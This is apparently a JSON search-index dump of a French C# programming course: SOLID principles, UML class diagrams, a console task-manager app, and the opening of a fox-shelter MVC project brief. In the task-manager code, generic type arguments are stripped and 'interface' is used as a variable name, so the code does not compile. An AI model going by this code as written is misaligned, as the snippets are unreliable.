l'extension, ferm\u00e9es \u00e0 la modification.  **L - Liskov Substitution Principle (LSP)** Les objets d\u00e9riv\u00e9s doivent pouvoir remplacer leurs objets de base.  **I - Interface Segregation Principle (ISP)** Les clients ne doivent pas d\u00e9pendre d'interfaces qu'ils n'utilisent pas.  **D - Dependency Inversion Principle (DIP)** D\u00e9pendre d'abstractions, pas de concr\u00e9tions.   <pre><code>// Exemple d'application des principes SOLID\n\n// SRP : Chaque classe a une responsabilit\u00e9 unique\npublic class Utilisateur\n{\n    public string Nom { get; set; }\n    public string Email { get; set; }\n}\n\npublic class ValidateurUtilisateur\n{\n    public bool Valider(Utilisateur utilisateur)\n    {\n        return !string.IsNullOrEmpty(utilisateur.Nom) &amp;&amp; \n               !string.IsNullOrEmpty(utilisateur.Email);\n    }\n}\n\npublic class ServiceEmail\n{\n    public void EnvoyerEmail(string destinataire, string message)\n    {\n        // Logique d'envoi d'email\n    }\n}\n\n// OCP : Extensible sans modification\npublic abstract class CalculateurPrix\n{\n    public abstract double Calculer(double prixBase);\n}\n\npublic class CalculateurPrixStandard : CalculateurPrix\n{\n    public override double Calculer(double prixBase)\n    {\n        return prixBase;\n    }\n}\n\npublic class CalculateurPrixAvecRemise : CalculateurPrix\n{\n    private double pourcentageRemise;\n\n    public CalculateurPrixAvecRemise(double remise)\n    {\n        pourcentageRemise = remise;\n    }\n\n    public override double Calculer(double prixBase)\n    {\n        return prixBase * (1 - pourcentageRemise / 100);\n    }\n}\n\n// ISP : Interfaces sp\u00e9cifiques\npublic interface ILisible\n{\n    string Lire();\n}\n\npublic interface IEcrivable\n{\n    void Ecrire(string contenu);\n}\n\npublic interface IExecutable\n{\n    void Executer();\n}\n\n// DIP : D\u00e9pendance d'abstraction\npublic interface IRepository&lt;T&gt;\n{\n    void Ajouter(T item);\n    T Obtenir(int id);\n    List&lt;T&gt; ObtenirTous();\n}\n\npublic class ServiceUtilisateur\n{\n    private readonly IRepository&lt;Utilisateur&gt; repository;\n\n    public ServiceUtilisateur(IRepository&lt;Utilisateur&gt; repo)\n    {\n        repository = repo; // Injection de d\u00e9pendance\n    }\n\n    public void CreerUtilisateur(Utilisateur utilisateur)\n    {\n        repository.Ajouter(utilisateur);\n    }\n}\n</code></pre> \ud83d\udcda Points cl\u00e9s \u00e0 retenir \ud83c\udfaf R\u00e9sum\u00e9 du chapitre : <ul> <li>Classes et objets : Mod\u00e9lisation du monde r\u00e9el en code</li> <li>Encapsulation : Protection des donn\u00e9es avec propri\u00e9t\u00e9s</li> <li>H\u00e9ritage : R\u00e9utilisation et sp\u00e9cialisation de code</li> <li>Polymorphisme : M\u00eame interface, comportements diff\u00e9rents</li> <li>Interfaces : Contrats que les classes doivent respecter</li> <li>SOLID : Principes pour un code maintenable et extensible</li> </ul> \u26a0\ufe0f Erreurs courantes \u00e0 \u00e9viter : <ul> <li>H\u00e9ritage abusif : Pr\u00e9f\u00e9rer la composition quand appropri\u00e9</li> <li>Classes trop grosses : Respecter le principe de responsabilit\u00e9 unique</li> <li>Couplage fort : Utiliser les interfaces pour d\u00e9coupler</li> <li>Pas de validation : Toujours valider dans les propri\u00e9t\u00e9s</li> </ul>"},{"location":"BTS/B2/B2_5_POO_CSharp/#liens-utiles","title":"\ud83d\udd17 Liens utiles","text":"<ul> <li>Classes et objets en C#</li> <li>H\u00e9ritage en C#</li> <li>Interfaces en C#</li> <li>Principes SOLID</li> </ul> <p>\u00c9tape pr\u00e9c\u00e9dente : B2.4 - Fonctions et m\u00e9thodes Prochaine \u00e9tape : B2.6 - Projets d'application</p>"},{"location":"BTS/B2/B2_6_Projets_applications/","title":"\ud83d\ude80 B2.6 - Projets d'Applications C","text":""},{"location":"BTS/B2/B2_6_Projets_applications/#objectifs-du-cours","title":"\ud83d\udccb Objectifs du cours","text":"<p>\u00c0 la fin de ce cours, vous serez capable de : - \u2705 Concevoir une application avec UML - \u2705 Structurer un projet C# professionnel - \u2705 Impl\u00e9menter des applications compl\u00e8tes - \u2705 Appliquer les bonnes pratiques de d\u00e9veloppement - \u2705 G\u00e9rer les erreurs et la validation - \u2705 Cr\u00e9er des interfaces utilisateur simples</p> \ud83d\udcd0 Introduction \u00e0 UML \ud83d\udcca Unified Modeling Language (UML)  UML est un langage de mod\u00e9lisation graphique qui permet de concevoir et documenter des syst\u00e8mes logiciels. Il aide \u00e0 visualiser la structure et le comportement d'une application avant de la d\u00e9velopper.  \ud83c\udfaf Diagrammes UML essentiels : <ul> <li>Diagramme de classes : Structure des classes et leurs relations</li> <li>Diagramme de cas d'usage : Fonctionnalit\u00e9s du syst\u00e8me</li> <li>Diagramme de s\u00e9quence : Interactions entre objets</li> <li>Diagramme d'activit\u00e9 : Flux de travail et processus</li> </ul> \ud83d\udcca Diagramme de classes Exemple : Syst\u00e8me de gestion de biblioth\u00e8que <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       Document          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 - titre: string         \u2502\n\u2502 - auteur: string        \u2502\n\u2502 - anneePublication: int \u2502\n\u2502 - estEmprunte: bool     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 + Emprunter(): bool     \u2502\n\u2502 + Retourner(): void     \u2502\n\u2502 + AfficherInfos(): void \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u25b3\n            \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502               \u2502\n\u250c\u2500\u2500\u2500\u25bd\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u25bd\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Livre    \u2502   \u2502 Magazine \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524   \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 - isbn     \u2502   \u2502 - numero \u2502\n\u2502 - pages    \u2502   \u2502 - period \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524   \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 + Lire()   \u2502   \u2502 + Lire() \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      Utilisateur        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 - nom: string           \u2502\n\u2502 - email: string         \u2502\n\u2502 - documentsEmpruntes    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 + EmprunterDocument()   \u2502\n\u2502 + RetournerDocument()   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2502\n            \u2502 1..*\n            \u25bd\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        Emprunt          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 - dateEmprunt: DateTime \u2502\n\u2502 - dateRetour: DateTime  \u2502\n\u2502 - document: Document    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 + CalculerRetard(): int \u2502\n\u2502 + CalculerAmende(): dec \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> \ud83c\udfaf Projet 1 : Gestionnaire de T\u00e2ches \ud83d\udcdd Description du projet Cr\u00e9er une application console pour g\u00e9rer des t\u00e2ches personnelles avec : - Cr\u00e9ation, modification, suppression de t\u00e2ches - Cat\u00e9gorisation et priorit\u00e9s - Suivi des \u00e9ch\u00e9ances - Sauvegarde en fichier JSON  \ud83d\udcd0 Conception UML Diagramme de classes - Gestionnaire de T\u00e2ches <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        Tache            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 - id: int               \u2502\n\u2502 - titre: string         \u2502\n\u2502 - description: string   \u2502\n\u2502 - dateCreation: DateTime\u2502\n\u2502 - dateEcheance: DateTime\u2502\n\u2502 - estTerminee: bool     \u2502\n\u2502 - priorite: Priorite    \u2502\n\u2502 - categorie: Categorie  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 + Terminer(): void      \u2502\n\u2502 + ModifierTitre(): void \u2502\n\u2502 + EstEnRetard(): bool   \u2502\n\u2502 + AfficherDetails(): void\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2502\n            \u2502 *\n            \u25bd\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   GestionnaireTaches    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 - taches: List&lt;Tache&gt;   \u2502\n\u2502 - prochainId: int       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 + AjouterTache(): void  \u2502\n\u2502 + SupprimerTache(): bool\u2502\n\u2502 + ListerTaches(): void  \u2502\n\u2502 + FiltrerParCategorie() \u2502\n\u2502 + SauvegarderFichier()  \u2502\n\u2502 + ChargerFichier(): void\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Priorite     \u2502    \u2502   Categorie     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524    \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 + Basse         \u2502    \u2502 + Travail       \u2502\n\u2502 + Normale       \u2502    \u2502 + Personnel     \u2502\n\u2502 + Haute         \u2502    \u2502 + Urgent        \u2502\n\u2502 + Critique      \u2502    \u2502 + Loisir        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> \ud83d\udcbb Impl\u00e9mentation  ```csharp using System; using System.Collections.Generic; using System.IO; using System.Linq; using Newtonsoft.Json;  // \u00c9num\u00e9rations public enum Priorite {     Basse = 1,     Normale = 2,     Haute = 3,     Critique = 4 }  public enum Categorie {     Travail,     Personnel,     Urgent,     Loisir,     Etudes,     Sante }  // Classe Tache public class Tache {     public int Id { get; set; }     public string Titre { get; set; }     public string Description { get; set; }     public DateTime DateCreation { get; set; }     public DateTime? DateEcheance { get; set; }     public bool EstTerminee { get; set; }     public Priorite Priorite { get; set; }     public Categorie Categorie { get; set; }      public Tache()     {         DateCreation = DateTime.Now;         EstTerminee = false;         Priorite = Priorite.Normale;     }      public Tache(string titre, string description, Categorie categorie, Priorite priorite = Priorite.Normale)     {         Titre = titre;         Description = description;         Categorie = categorie;         Priorite = priorite;         DateCreation = DateTime.Now;         EstTerminee = false;     }      public void Terminer()     {         EstTerminee = true;         Console.WriteLine($\"\u2705 T\u00e2che '{Titre}' marqu\u00e9e comme termin\u00e9e !\");     }      public void ModifierTitre(string nouveauTitre)     {         string ancienTitre = Titre;         Titre = nouveauTitre;         Console.WriteLine($\"\ud83d\udcdd Titre modifi\u00e9 : '{ancienTitre}' \u2192 '{nouveauTitre}'\");     }      public bool EstEnRetard()     {         return DateEcheance.HasValue &amp;&amp;                 DateTime.Now &gt; DateEcheance.Value &amp;&amp;                 !EstTerminee;     }      public void AfficherDetails()     {         Console.WriteLine($\"\\n\ud83d\udccb T\u00e2che #{Id}\");         Console.WriteLine($\"   Titre : {Titre}\");         Console.WriteLine($\"   Description : {Description}\");         Console.WriteLine($\"   Cat\u00e9gorie : {Categorie}\");         Console.WriteLine($\"   Priorit\u00e9 : {Priorite}\");         Console.WriteLine($\"   Cr\u00e9\u00e9e le : {DateCreation:dd/MM/yyyy HH:mm}\");          if (DateEcheance.HasValue)         {             Console.WriteLine($\"   \u00c9ch\u00e9ance : {DateEcheance:dd/MM/yyyy HH:mm}\");             if (EstEnRetard())                 Console.WriteLine(\"   \u26a0\ufe0f  EN RETARD !\");         }          Console.WriteLine($\"   Statut : {(EstTerminee ? \"\u2705 Termin\u00e9e\" : \"\u23f3 En cours\")}\");     }      public string ObtenirIconePriorite()     {         return Priorite switch         {             Priorite.Basse =&gt; \"\ud83d\udfe2\",             Priorite.Normale =&gt; \"\ud83d\udfe1\",             Priorite.Haute =&gt; \"\ud83d\udfe0\",             Priorite.Critique =&gt; \"\ud83d\udd34\",             _ =&gt; \"\u26aa\"         };     } }  // Classe GestionnaireTaches public class GestionnaireTaches {     private List taches;     private int prochainId;     private const string FICHIER_SAUVEGARDE = \"taches.json\";      public GestionnaireTaches()     {         taches = new List();         prochainId = 1;         ChargerFichier();     }      public void AjouterTache(string titre, string description, Categorie categorie,                             Priorite priorite = Priorite.Normale, DateTime? echeance = null)     {         if (string.IsNullOrWhiteSpace(titre))         {             Console.WriteLine(\"\u274c Le titre ne peut pas \u00eatre vide !\");             return;         }          var nouvelleTache = new Tache(titre, description, categorie, priorite)         {             Id = prochainId++,             DateEcheance = echeance         };          taches.Add(nouvelleTache);         Console.WriteLine($\"\u2705 T\u00e2che '{titre}' ajout\u00e9e avec succ\u00e8s !\");         SauvegarderFichier();     }      public bool SupprimerTache(int id)     {         var tache = taches.FirstOrDefault(t =&gt; t.Id == id);         if (tache == null)         {             Console.WriteLine($\"\u274c Aucune t\u00e2che trouv\u00e9e avec l'ID {id}\");             return false;         }          taches.Remove(tache);         Console.WriteLine($\"\ud83d\uddd1\ufe0f  T\u00e2che '{tache.Titre}' supprim\u00e9e\");         SauvegarderFichier();         return true;     }      public void ListerTaches(bool afficherTerminees = true)     {         var tachesAfficher = afficherTerminees ?              taches : taches.Where(t =&gt; !t.EstTerminee).ToList();          if (!tachesAfficher.Any())         {             Console.WriteLine(\"\ud83d\udced Aucune t\u00e2che \u00e0 afficher\");             return;         }          Console.WriteLine(\"\\n\ud83d\udccb LISTE DES T\u00c2CHES\");         Console.WriteLine(\"==================\");          foreach (var tache in tachesAfficher.OrderBy(t =&gt; t.EstTerminee)                                            .ThenByDescending(t =&gt; t.Priorite)                                            .ThenBy(t =&gt; t.DateEcheance))         {             string statut = tache.EstTerminee ? \"\u2705\" : \"\u23f3\";             string retard = tache.EstEnRetard() ? \" \u26a0\ufe0f\" : \"\";             string echeance = tache.DateEcheance?.ToString(\"dd/MM\") ?? \"Sans \u00e9ch\u00e9ance\";              Console.WriteLine($\"{statut} #{tache.Id:D2} {tache.ObtenirIconePriorite()} \" +                             $\"{tache.Titre} ({tache.Categorie}) - {echeance}{retard}\");         }     }      public void FiltrerParCategorie(Categorie categorie)     {         var tachesFiltrees = taches.Where(t =&gt; t.Categorie == categorie).ToList();          Console.WriteLine($\"\\n\ud83d\udcc2 T\u00e2ches de la cat\u00e9gorie : {categorie}\");         Console.WriteLine(\"=====================================\");          if (!tachesFiltrees.Any())         {             Console.WriteLine(\"\ud83d\udced Aucune t\u00e2che dans cette cat\u00e9gorie\");             return;         }          foreach (var tache in tachesFiltrees)         {             tache.AfficherDetails();         }     }      public void AfficherStatistiques()     {         int total = taches.Count;         int terminees = taches.Count(t =&gt; t.EstTerminee);         int enRetard = taches.Count(t =&gt; t.EstEnRetard());         int critiques = taches.Count(t =&gt; t.Priorite == Priorite.Critique &amp;&amp; !t.EstTerminee);          Console.WriteLine(\"\\n\ud83d\udcca STATISTIQUES\");         Console.WriteLine(\"================\");         Console.WriteLine($\"Total des t\u00e2ches : {total}\");         Console.WriteLine($\"Termin\u00e9es : {terminees} ({(total &gt; 0 ? (terminees * 100.0 / total):0):F1}%)\");         Console.WriteLine($\"En retard : {enRetard}\");         Console.WriteLine($\"Critiques en cours : {critiques}\");          if (total &gt; 0)         {             var categorieStats = taches.GroupBy(t =&gt; t.Categorie)                                       .Select(g =&gt; new { Categorie = g.Key, Count = g.Count() })                                       .OrderByDescending(x =&gt; x.Count);              Console.WriteLine(\"\\nR\u00e9partition par cat\u00e9gorie :\");             foreach (var stat in categorieStats)             {                 Console.WriteLine($\"  {stat.Categorie} : {stat.Count}\");             }         }     }      public Tache ObtenirTache(int id)     {         return taches.FirstOrDefault(t =&gt; t.Id == id);     }      public void SauvegarderFichier()     {         try         {             var json = JsonConvert.SerializeObject(taches, Formatting.Indented);             File.WriteAllText(FICHIER_SAUVEGARDE, json);         }         catch (Exception ex)         {             Console.WriteLine($\"\u274c Erreur lors de la sauvegarde : {ex.Message}\");         }     }      public void ChargerFichier()     {         try         {             if (File.Exists(FICHIER_SAUVEGARDE))             {                 var json = File.ReadAllText(FICHIER_SAUVEGARDE);                 taches = JsonConvert.DeserializeObject&gt;(json) ?? new List();                  if (taches.Any())                 {                     prochainId = taches.Max(t =&gt; t.Id) + 1;                     Console.WriteLine($\"\ud83d\udcc2 {taches.Count} t\u00e2che(s) charg\u00e9e(s) depuis le fichier\");                 }             }         }         catch (Exception ex)         {             Console.WriteLine($\"\u274c Erreur lors du chargement : {ex.Message}\");             taches = new List();         }     } }  // Interface utilisateur console public class InterfaceConsole {     private GestionnaireTaches gestionnaire;      public InterfaceConsole()     {         gestionnaire = new GestionnaireTaches();     }      public void Demarrer()     {         Console.WriteLine(\"\ud83c\udfaf GESTIONNAIRE DE T\u00c2CHES\");         Console.WriteLine(\"=========================\");          bool continuer = true;         while (continuer)         {             AfficherMenu();             string choix = Console.ReadLine();              switch (choix)             {                 case \"1\":                     AjouterNouvelleTache();                     break;                 case \"2\":                     gestionnaire.ListerTaches();                     break;                 case \"3\":                     TerminerTache();                     break;                 case \"4\":                     SupprimerTache();                     break;                 case \"5\":                     FiltrerParCategorie();                     break;                 case \"6\":                     gestionnaire.AfficherStatistiques();                     break;                 case \"7\":                     AfficherDetailsTache();                     break;                 case \"0\":                     continuer = false;                     Console.WriteLine(\"\ud83d\udc4b Au revoir !\");                     break;                 default:                     Console.WriteLine(\"\u274c Choix invalide !\");                     break;             }              if (continuer)             {                 Console.WriteLine(\"\\nAppuyez sur une touche pour continuer...\");                 Console.ReadKey();                 Console.Clear();             }         }     }      private void AfficherMenu()     {         Console.WriteLine(\"\\n\ud83d\udccb MENU PRINCIPAL\");         Console.WriteLine(\"==================\");         Console.WriteLine(\"1. \u2795 Ajouter une t\u00e2che\");         Console.WriteLine(\"2. \ud83d\udccb Lister les t\u00e2ches\");         Console.WriteLine(\"3. \u2705 Terminer une t\u00e2che\");         Console.WriteLine(\"4. \ud83d\uddd1\ufe0f  Supprimer une t\u00e2che\");         Console.WriteLine(\"5. \ud83d\udcc2 Filtrer par cat\u00e9gorie\");         Console.WriteLine(\"6. \ud83d\udcca Afficher les statistiques\");         Console.WriteLine(\"7. \ud83d\udd0d D\u00e9tails d'une t\u00e2che\");         Console.WriteLine(\"0. \ud83d\udeaa Quitter\");         Console.Write(\"\\nVotre choix : \");     }      private void AjouterNouvelleTache()     {         Console.WriteLine(\"\\n\u2795 AJOUTER UNE NOUVELLE T\u00c2CHE\");         Console.WriteLine(\"==============================\");          Console.Write(\"Titre : \");         string titre = Console.ReadLine();          Console.Write(\"Description : \");         string description = Console.ReadLine();          // S\u00e9lection de la cat\u00e9gorie         Console.WriteLine(\"\\nCat\u00e9gories disponibles :\");         var categories = Enum.GetValues();         for (int i = 0; i &lt; categories.Length; i++)         {             Console.WriteLine($\"{i + 1}. {categories[i]}\");         }          Console.Write(\"Choisissez une cat\u00e9gorie (1-6) : \");         if (int.TryParse(Console.ReadLine(), out int choixCategorie) &amp;&amp;              choixCategorie &gt;= 1 &amp;&amp; choixCategorie &lt;= categories.Length)         {             Categorie categorie = categories[choixCategorie - 1];              // S\u00e9lection de la priorit\u00e9             Console.WriteLine(\"\\nPriorit\u00e9s disponibles :\");             var priorites = Enum.GetValues();             for (int i = 0; i &lt; priorites.Length; i++)             {                 Console.WriteLine($\"{i + 1}. {priorites[i]}\");             }              Console.Write(\"Choisissez une priorit\u00e9 (1-4, d\u00e9faut=2) : \");             Priorite priorite = Priorite.Normale;             if (int.TryParse(Console.ReadLine(), out int choixPriorite) &amp;&amp;                  choixPriorite &gt;= 1 &amp;&amp; choixPriorite &lt;= priorites.Length)             {                 priorite = priorites[choixPriorite - 1];             }              // \u00c9ch\u00e9ance optionnelle             Console.Write(\"Date d'\u00e9ch\u00e9ance (dd/MM/yyyy, optionnel) : \");             DateTime? echeance = null;             string dateStr = Console.ReadLine();             if (!string.IsNullOrWhiteSpace(dateStr) &amp;&amp;                  DateTime.TryParseExact(dateStr, \"dd/MM/yyyy\", null,                                       System.Globalization.DateTimeStyles.None, out DateTime date))             {                 echeance = date;             }              gestionnaire.AjouterTache(titre, description, categorie, priorite, echeance);         }         else         {             Console.WriteLine(\"\u274c Cat\u00e9gorie invalide !\");         }     }      private void TerminerTache()     {         Console.Write(\"\\n\u2705 ID de la t\u00e2che \u00e0 terminer : \");         if (int.TryParse(Console.ReadLine(), out int id))         {             var tache = gestionnaire.ObtenirTache(id);             if (tache != null)             {                 tache.Terminer();                 gestionnaire.SauvegarderFichier();             }             else             {                 Console.WriteLine($\"\u274c Aucune t\u00e2che trouv\u00e9e avec l'ID {id}\");             }         }         else         {             Console.WriteLine(\"\u274c ID invalide !\");         }     }      private void SupprimerTache()     {         Console.Write(\"\\n\ud83d\uddd1\ufe0f  ID de la t\u00e2che \u00e0 supprimer : \");         if (int.TryParse(Console.ReadLine(), out int id))         {             gestionnaire.SupprimerTache(id);         }         else         {             Console.WriteLine(\"\u274c ID invalide !\");         }     }      private void FiltrerParCategorie()     {         Console.WriteLine(\"\\n\ud83d\udcc2 FILTRER PAR CAT\u00c9GORIE\");         Console.WriteLine(\"=========================\");          var categories = Enum.GetValues();         for (int i = 0; i &lt; categories.Length; i++)         {             Console.WriteLine($\"{i + 1}. {categories[i]}\");         }          Console.Write(\"Choisissez une cat\u00e9gorie (1-6) : \");         if (int.TryParse(Console.ReadLine(), out int choix) &amp;&amp;              choix &gt;= 1 &amp;&amp; choix &lt;= categories.Length)         {             gestionnaire.FiltrerParCategorie(categories[choix - 1]);         }         else         {             Console.WriteLine(\"\u274c Choix invalide !\");         }     }      private void AfficherDetailsTache()     {         Console.Write(\"\\n\ud83d\udd0d ID de la t\u00e2che \u00e0 afficher : \");         if (int.TryParse(Console.ReadLine(), out int id))         {             var tache = gestionnaire.ObtenirTache(id);             if (tache != null)             {                 tache.AfficherDetails();             }             else             {                 Console.WriteLine($\"\u274c Aucune t\u00e2che trouv\u00e9e avec l'ID {id}\");             }         }         else         {             Console.WriteLine(\"\u274c ID invalide !\");         }     } }  // Programme principal class Program {     static void Main(string[] args)     {         try         {             var interface = new InterfaceConsole();             interface.Demarrer();         }         catch (Exception ex)         {             Console.WriteLine($\"\u274c Erreur fatale : {ex.Message}\");             Console.WriteLine(\"Appuyez sur une touche pour quitter...\");             Console.ReadKey();         }     } }"},{"location":"BTS/B2/B2_7_Projet_FoxShelter/","title":"\ud83e\udd8a B2.7 - Projet FoxShelter - Gestion de Refuge pour Renards","text":""},{"location":"BTS/B2/B2_7_Projet_FoxShelter/#foxshelter","title":"\ud83e\udd8a FoxShelter","text":"<p>Syst\u00e8me de gestion de refuge pour renards - Projet BTS SIO 1 SLAM</p>"},{"location":"BTS/B2/B2_7_Projet_FoxShelter/#objectifs-du-projet","title":"\ud83d\udccb Objectifs du projet","text":"<p>\u00c0 la fin de ce projet, vous serez capable de : - \u2705 Concevoir une application compl\u00e8te avec UML - \u2705 Impl\u00e9menter le pattern MVC en C# - \u2705 G\u00e9rer une base de donn\u00e9es avec Entity Framework - \u2705 Appliquer tous les concepts de POO - \u2705 Cr\u00e9er une interface utilisateur fonctionnelle - \u2705 Documenter et tester votre application</p>"},{"location":"BTS/B2/B2_7_Projet_FoxShelter/#cahier-des-charges","title":"\ud83c\udfaf Cahier des charges","text":"<p>\ud83d\udccb Contexte du projet</p> <p>Le refuge \"FoxShelter\" accueille des renards bless\u00e9s, orphelins ou en d\u00e9tresse. L'association a besoin d'un syst\u00e8me informatique pour g\u00e9rer efficacement les animaux, le personnel, les soins v\u00e9t\u00e9rinaires et les finances.</p>"},{"location":"BTS/B2/B2_7_Projet_FoxShelter/#fonctionnalites-principales","title":"\ud83c\udfaa Fonctionnalit\u00e9s principales","text":"<ul> <li>\ud83e\udd8a Gestion des Renards : Enregistrement, suivi m\u00e9dical, historique des soins, statut d'adoption</li> <li>\ud83d\udc65 Gestion du Personnel : V\u00e9t\u00e9rinaires, b\u00e9n\u00e9voles, planning des \u00e9quipes, gestion des r\u00f4les  </li> <li>\ud83d\udc8a Suivi M\u00e9dical : Dossiers v\u00e9t\u00e9rinaires, traitements, vaccinations, examens</li> <li>\ud83c\udfe0 Processus d'Adoption : Candidatures, \u00e9valuations, suivi post-adoption</li> <li>\ud83d\udcb0 Gestion Financi\u00e8re : Dons, frais v\u00e9t\u00e9rinaires, budget du refuge</li> <li>\ud83d\udcca Tableaux de Bord : Statistiques, rapports, indicateurs de performance</li> </ul>"},{"location":"BTS/B2/B2_7_Projet_FoxShelter/#architecture-du-projet","title":"\ud83c\udfd7\ufe0f Architecture du projet","text":""},{"location":"BTS/B2/B2_7_Projet_FoxShelter/#pattern-mvc-model-view-controller","title":"\ud83d\udcd0 Pattern MVC (Model-View-Controller)","text":"<p>\ud83c\udfaf Structure du projet</p> <ul> <li>Models : Entit\u00e9s m\u00e9tier (Renard, Personne, SoinVeterinaire...)</li> <li>Views : Interfaces utilisateur (formulaires, listes, rapports)</li> <li>Controllers : Logique de traitement et coordination</li> <li>Data : Acc\u00e8s aux donn\u00e9es avec Entity Framework</li> </ul> <p>\ud83d\udee0\ufe0f Stack Technologique</p> <ul> <li>Langage : C# .NET 6.0</li> <li>Framework : ASP.NET Core MVC</li> <li>Base de 